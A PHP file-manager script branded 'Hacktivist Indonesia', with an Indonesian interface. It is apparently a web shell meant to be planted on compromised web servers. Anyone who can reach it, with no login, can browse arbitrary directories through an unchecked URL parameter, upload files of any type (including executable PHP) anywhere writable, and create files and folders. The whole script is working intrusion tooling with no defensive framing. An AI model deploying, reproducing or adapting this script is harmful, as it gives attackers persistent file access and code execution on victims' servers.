<?php

$current_dir = isset($_GET['dir']) ? $_GET['dir'] : '.';

if (isset($_FILES['file_to_upload'])) {
    $upload_file = $current_dir . '/' . basename($_FILES['file_to_upload']['name']);
    if (move_uploaded_file($_FILES['file_to_upload']['tmp_name'], $upload_file)) {
        echo "<div class='success'>File berhasil diunggah.</div>";
    } else {
        echo "<div class='error'>Gagal mengunggah file.</div>";
    }
}

if (isset($_POST['new_file'])) {
    $new_file_path = $current_dir . '/' . $_POST['new_file'];
    if (file_put_contents($new_file_path, '') !== false) {
        echo "<div class='success'>File berhasil dibuat.</div>";
    } else {
        echo "<div class='error'>Gagal membuat file.</div>";
    }
}

if (isset($_POST['new_folder'])) {
    $new_folder_path = $current_dir . '/' . $_POST['new_folder'];
    if (mkdir($new_folder_path)) {
        echo "<div class='success'>Folder berhasil dibuat.</div>";
    } else {
        echo "<div class='error'>Gagal membuat folder.</div>";
    }
}

$files = scandir($current_dir);

function formatSize($size) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    for ($i = 0; $size >= 1024 && $i < count($units) - 1; $i++) {
        $size /= 1024;
    }
    return round($size, 2) . ' ' . $units[$i];
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP File Manager SukaJanda01</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            color: #333;
            margin: 0;
            padding: 20px;
        }
        h2 {
            text-align: center;
            color: #444;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: #fff;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        form {
            margin-bottom: 20px;
        }
        input[type="text"], input[type="file"] {
            width: 100%;
            padding: 8px;
            margin: 10px 0;
            box-sizing: border-box;
            border: 1px solid #ccc;
        }
        input[type="submit"] {
            background: #007BFF;
            color: #fff;
            padding: 10px;
            border: none;
            cursor: pointer;
            width: 100%;
        }
        input[type="submit"]:hover {
            background: #0056b3;
        }
        .success {
            color: green;
            margin-bottom: 10px;
        }
        .error {
            color: red;
            margin-bottom: 10px;
        }
        ul {
            list-style-type: none;
            padding: 0;
        }
        ul li {
            padding: 10px;
            background: #f9f9f9;
            border: 1px solid #ddd;
            margin-bottom: 5px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        ul li a {
            color: #007BFF;
            text-decoration: none;
        }
        ul li a:hover {
            text-decoration: underline;
        }
        .file-info {
            font-size: 0.9em;
            color: #666;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>PhP File Manager Hacktivist Indonesia</h2>

    <form enctype="multipart/form-data" method="post">
        Pilih file: <input name="file_to_upload" type="file"><br><br>
        <input type="submit" value="Upload File">
    </form>

    <hr>

    <form method="post">
        Nama file baru: <input type="text" name="new_file" placeholder="contoh.txt"><br><br>
        <input type="submit" value="Buat File">
    </form>

    <hr>

    <form method="post">
        Nama folder baru: <input type="text" name="new_folder" placeholder="nama_folder"><br><br>
        <input type="submit" value="Buat Folder">
    </form>

    <hr>

    <h3>Daftar File dan Folder</h3>
    <ul>
        <?php foreach ($files as $file): ?>
            <?php if ($file == '.' || $file == '..') continue; ?>
            <li>
                <?php if (is_dir($current_dir . '/' . $file)): ?>
                    <a href="?dir=<?php echo $current_dir . '/' . $file; ?>"><?php echo $file; ?>/</a>
                <?php else: ?>
                    <?php echo $file; ?>
                    <span class="file-info">
                        - Ukuran: <?php echo formatSize(filesize($current_dir . '/' . $file)); ?>
                        - Izin: <?php echo substr(sprintf('%o', fileperms($current_dir . '/' . $file)), -4); ?>
                    </span>
                <?php endif; ?>
            </li>
        <?php endforeach; ?>
    </ul>
</div>

</body>
</html>
